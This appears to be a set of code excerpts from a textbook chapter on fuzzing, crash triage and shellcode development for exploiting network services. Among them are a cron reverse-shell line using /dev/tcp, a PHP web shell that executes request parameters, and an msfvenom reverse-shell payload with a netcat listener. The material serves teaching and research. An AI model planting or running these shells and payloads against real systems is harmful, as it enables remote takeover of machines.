["```\n$ cat /dev/urandom | nc hostname port\n```", "```\nvoid SimpleFuzzer(const char* data, size_t length) {\n   size_t position = RandomInt(length);\n   size_t bit = RandomInt(8);\n\n   char* copy = CopyData(data, length);\n   copy[position] ^= (1 << bit);\n   SendData(copy, length);\n}\n```", "```\n(2228.1b44): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n00000000`41414141 ??              ???\n```", "```\n   GNU gdb 7.7.1\n   (gdb) r\n   Starting program: /home/user/triage/stack_overflow\n\n   Program received signal SIGSEGV, Segmentation fault.\n➊ 0x41414141 in ?? ()\n\n➋ (gdb) x/i $pc\n   => 0x41414141:  Cannot access memory at address 0x41414141\n➌ (gdb) x/16xw $sp-16\n   0xbffff620:     0x41414141      0x41414141      0x41414141      0x41414141\n   0xbffff630:     0x41414141      0x41414141      0x41414141      0x41414141\n   0xbffff640:     0x41414141      0x41414141      0x41414141      0x41414141\n   0xbffff650:     0x41414141      0x41414141      0x41414141      0x41414141\n```", "```\n   user@debian:~/triage$ gdb ./heap_overflow\n   GNU gdb 7.7.1\n\n   (gdb) r\n   Starting program: /home/user/triage/heap_overflow\n\n   Program received signal SIGSEGV, Segmentation fault.\n   0x0804862b in main ()\n➊ (gdb) x/i $pc\n   => 0x804862b <main+112>:        mov    (%eax),%eax\n\n➋ (gdb) info registers $eax\n   eax            0x41414141       1094795585\n\n   (gdb) x/5i $pc\n   => 0x804862b <main+112>:        mov    (%eax),%eax\n      0x804862d <main+114>:        sub    $0xc,%esp\n      0x8048630 <main+117>:        pushl  -0x10(%ebp)\n    ➌ 0x8048633 <main+120>:        call   *%eax\n      0x8048635 <main+122>:        add    $0x10,%esp\n (gdb) disassemble\n   Dump of assembler code for function main:\n      ...\n    ➍ 0x08048626 <+107>:   mov    -0x10(%ebp),%eax\n      0x08048629 <+110>:   mov    (%eax),%eax\n   => 0x0804862b <+112>:   mov    (%eax),%eax\n      0x0804862d <+114>:   sub    $0xc,%esp\n      0x08048630 <+117>:   pushl  -0x10(%ebp)\n      0x08048633 <+120>:   call   *%eax\n\n   (gdb) x/w $ebp-0x10\n   0xbffff708:     0x0804a030\n\n➎ (gdb) x/4w 0x0804a030\n   0x804a030:      0x41414141      0x41414141      0x41414141      0x41414141\n\n   (gdb) info proc mappings\n   process 4578\n   Mapped address spaces:\n\n       Start Addr    End Addr       Size  Offset  objfile\n        0x8048000   0x8049000     0x1000     0x0  /home/user/triage/heap_overflow\n        0x8049000   0x804a000     0x1000     0x0  /home/user/triage/heap_overflow\n      ➏ 0x804a000   0x806b000    0x21000     0x0  [heap]\n       0xb7cce000  0xb7cd0000     0x2000     0x0\n       0xb7cd0000  0xb7e77000   0x1a7000     0x0  /lib/libc-2.19.so\n```", "```\n==3998==ERROR: AddressSanitizer: heap-buffer-overflow➊ on address\n0xb6102bf4➋ at pc 0x081087ae➌ bp 0xbf9c64d8 sp 0xbf9c64d0\nWRITE of size 1➍ at 0xb6102bf4 thread T0\n #0 0x81087ad (/home/user/triage/heap_overflow+0x81087ad)\n    #1 0xb74cba62 (/lib/i386-linux-gnu/i686/cmov/libc.so.6+0x19a62)\n    #2 0x8108430 (/home/user/triage/heap_overflow +0x8108430)\n```", "```\n$ export ASAN_OPTIONS=symbolize=1\n$ export ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer-3.5\n$ ./heap_overflow\n=================================================================\n==4035==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb6202bf4 at pc 0x081087ae bp 0xbf97a418 sp 0xbf97a410\nWRITE of size 1 at 0xb6202bf4 thread T0\n    #0 0x81087ad in main /home/user/triage/heap_overflow.c:8:3➊\n    #1 0xb75a4a62 in __libc_start_main /build/libc-start.c:287\n    #2 0x8108430 in _start (/home/user/triage/heap_overflow+0x8108430)\n```", "```\nC:\\> gflags.exe -i appname.exe +hpa\n```", "```\nstruct Session {\n    int socket;\n    int is_admin;\n};\n\nSession* session = WaitForConnection();\n```", "```\nCommand c = ReadCommand(session->socket);\nif (c.command == CMD_RUN_COMMAND\n    && session->is_admin) {\n  system(c->data);\n}\n```", "```\n* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'\n```", "```\n<?php\nif (isset($_REQUEST['exec'])) {\n  $exec = $_REQUEST['exec'];\n  $result = system($exec);\n  echo $result;\n}\n?>\n```", "```\nsudo apt-get install build-essential nasm\n```", "```\n #include <fcntl.h>\n #include <stdio.h>\n #include <stdlib.h>\n #include <sys/mman.h>\n #include <sys/stat.h>\n #include <unistd.h>\n\n typedef int (*exec_code_t)(void);\n\n int main(int argc, char** argv) {\n   if (argc < 2) {\n     printf(\"Usage: test_shellcode shellcode.bin\\n\");\n     exit(1);\n   }\n\n➊ int fd = open(argv[1], O_RDONLY);\n   if (fd <= 0) {\n     perror(\"open\");\n     exit(1);\n   }\n\n   struct stat st;\n   if (fstat(fd, &st) == -1) {\n     perror(\"stat\");\n     exit(1);\n   }\n\n➋ exec_code_t shell = mmap(NULL, st.st_size,\n  ➌ PROT_EXEC | PROT_READ, MAP_PRIVATE, fd, 0);\n if (shell == MAP_FAILED) {\n     perror(\"mmap\");\n     exit(1);\n   }\n\n   printf(\"Mapped Address: %p\\n\", shell);\n   printf(\"Shell Result: %d\\n\", shell());\n\n   return 0;\n }\n```", "```\n$ cc –Wall –o test_shellcode test_shellcode.c\n```", "```\n; Assemble as 64 bit\nBITS 64\nmov rax, 100\nret\n```", "```\n$ nasm -f bin -o shellcode.bin shellcode.asm\n$ ./test_shellcode shellcode.bin\nMapped Address: 0x7fa51e860000\nShell Result: 100\n```", "```\n$ ndisasm -b 64 shellcofe.bin\n00000000  B864000000        mov eax,0x64\n00000005  C3                ret\n```", "```\n# Assemble as 64 bit\nBITS 64\nint3\nmov rax, 100\nret\n```", "```\n   $ gdb --args ./test_shellcode shellcode.bin\n   GNU gdb 7.7.1\n   ...\n   (gdb) display/1i $rip\n   (gdb) r\n   Starting program: /home/user/test_shellcode debug_break.bin\n   Mapped Address: 0x7fb6584f3000\n\n➊ Program received signal SIGTRAP, Trace/breakpoint trap.\n 0x00007fb6584f3001 in ?? ()\n   1: x/i $rip\n➋ => 0x7fb6584f3001:      mov    $0x64,%eax\n   (gdb) stepi\n   0x00007fb6584f3006 in ?? ()\n   1: x/i $rip\n   => 0x7fb6584f3006:      retq\n   (gdb)\n   0x00000000004007f6 in main ()\n   1: x/i $rip\n   => 0x4007f6 <main+281>: mov    %eax,%esi\n```", "```\n#include <stdio.h>\n#include <sys/syscall.h>\n\nint main() {\n  printf(\"Syscall: %d\\n\", SYS_exit);\n  return 0;\n}\n```", "```\nBITS 64\n; The syscall number of exit\nmov rax, 60\n; The exit code argument\nmov rdi, 42\nsyscall\n ; exit should never return, but just in case.\nret\n```", "```\nssize_t write(int fd, const void *buf, size_t count);\n```", "```\nBITS 64\n\n%define SYS_write 1\n%define STDOUT 1\n\n_start:\n  mov rax, SYS_write\n; The first argument (rdi) is the STDOUT file descriptor\n  mov rdi, STDOUT\n; The second argument (rsi) is a pointer to a string\n  lea rsi, [_greeting]\n; The third argument (rdx) is the length of the string to write\n  mov rdx, _greeting_end - _greeting\n; Execute the write system call\n  syscall\n  ret\n\n_greeting:\n  db \"Hello User!\", 10\n_greeting_end:\n```", "```\n$ nasm -f bin -o shellcode.bin shellcode.asm\n$ ./test_shellcode shellcode.bin\nMapped Address: 0x7f165ce1f000\nShell Result: -14\n```", "```\nimport os\n\n# Specify the positive error number\nerr = 14\nprint os.errno.errorcode[err]\n# Prints 'EFAULT'\nprint os.strerror(err)\n# Prints 'Bad address'\n```", "```\n00000000  B801000000        mov rax,0x1\n00000005  BF01000000        mov rdi,0x1\n0000000A  488D34251A000000  lea rsi,[0x1a]\n00000012  BA0C000000        mov rdx,0xc\n00000017  0F05              syscall\n00000019  C3                ret\n0000001A  db \"Hello User!\", 10\n```", "```\ncall _get_rip\n_get_rip:\n; Pop return address off the stack\npop rsi\n; Add relative offset from return to greeting\nadd rsi, _greeting - _get_rip\n```", "```\nlea rsi, [rel _greeting]\n```", "```\n$ nasm -f bin -o shellcode.bin shellcode.asm\n$ ./test_shellcode shellcode.bin\nMapped Address: 0x7f165dedf000\nHello User!\nShell Result: 12\n```", "```\n BITS 64\n\n %define SYS_execve 59\n\n _start:\n   mov rax, SYS_execve\n ; Load the executable path\n➊ lea rdi, [rel _exec_path]\n ; Load the argument\n   lea rsi, [rel _argument]\n ; Build argument array on stack = { _exec_path, _argument, NULL }\n➋ push 0\n   push rsi\n   push rdi\n➌ mov rsi, rsp\n ; Build environment array on stack = { NULL }\n   push 0\n➍ mov rdx, rsp\n➎ syscall\n ; execve shouldn't return, but just in case\n   ret\n\n _exec_path:\n   db \"/bin/uname\", 0\n _argument:\n   db \"-a\", 0\n```", "```\nchar* args[] = { \"/bin/uname\",  \"-a\", NULL };\nchar* envp[] = { NULL };\nexecve(\"/bin/uname\", args, envp);\n```", "```\n$ nasm -f bin -o execve.bin execve.asm\n$ ./test_shellcode execv.bin\n Mapped Address: 0x7fbdc3c1e000\nLinux foobar 4.4.0 Wed Dec 31 14:42:53 PST 2014 x86_64 x86_64 x86_64 GNU/Linux\n```", "```\n# msfvenom -l | grep linux/x64\n--snip--\nlinux/x64/shell_bind_tcp    Listen for a connection and spawn a command shell\nlinux/x64/shell_reverse_tcp Connect back to attacker and spawn a command shell\n```", "```\n# msfvenom -p linux/x64/shell_reverse_tcp -f raw LHOST=172.21.21.1\\\n           LPORT=4444 > msf_shellcode.bin\n```", "```\n$ nc -l 4444\n# Wait for connection\nid\nuid=1000(user) gid=1000(user) groups=1000(user)\n```", "```\nGNU gdb 7.7.1\n(gdb) r\nStarting program: /home/user/triage/dep\n\nProgram received signal SIGSEGV, Segmentation fault.\n0xbffff730 in ?? ()\n\n(gdb) x/3i $pc\n=> 0xbffff730:  push   $0x2a➊\n   0xbffff732:  pop    %eax\n   0xbffff733:  ret\n```", "```\nint system(const char *command);\n```", "```\nsystem(\"ls\");\n```", "```\nxchg esp, eax # Exchange the EAX and ESP registers\nret           # Return, will execute address on new stack\n```"]